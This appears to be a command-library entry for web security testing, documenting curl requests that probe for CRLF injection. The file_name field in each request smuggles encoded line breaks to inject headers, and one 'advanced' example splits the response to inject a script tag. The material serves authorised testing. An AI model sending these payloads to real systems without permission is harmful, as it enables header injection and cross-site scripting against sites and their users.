---
data: >-
  curl -X POST 'https://pangle-endpoint.example.com/upload' -d
  'file_name=test%0d%0aInjected-Header:%20Value' -v
tags:
  - web-testing
  - injection
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 1d95c689-baa9-45b8-a5f5-fe2162d2eef3
created_at: '2025-12-13T23:55:37.773Z'
updated_at: '2025-12-13T23:55:37.773Z'
verified: false
validated: true
submitted: true
---
# curl-crlf-injection-test

## Command

```bash
curl -X POST 'https://pangle-endpoint.example.com/upload' -d 'file_name=test%0d%0aInjected-Header:%20Value' -v
```

## Description

This command tests for CRLF injection by sending a POST request with URL-encoded CRLF (%0d%0a) in the file_name parameter, attempting to inject a custom header. Use it to probe web endpoints for response splitting vulnerabilities.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP method | Yes |
| `'https://...'` | Target endpoint URL | Yes |
| `-d '...'` | Data payload with encoded CRLF | Yes |
| `-v` | Verbose output to inspect headers | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://target.com/endpoint' -d 'file_name=inject%0d%0aTest:%20Header' -v
```

### Advanced Usage

```bash
curl -X POST 'https://target.com/endpoint' -d 'file_name=advanced%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>' -v --output response.html
```

## Expected Output

Verbose logs showing request/response headers. Look for the injected 'Test: Header' appearing in the response, indicating successful CRLF injection. If no injection, headers remain clean.

## Related

- [[Related Procedure: Exploit-CRLF-Injection-in-File-Name-Parameter]]
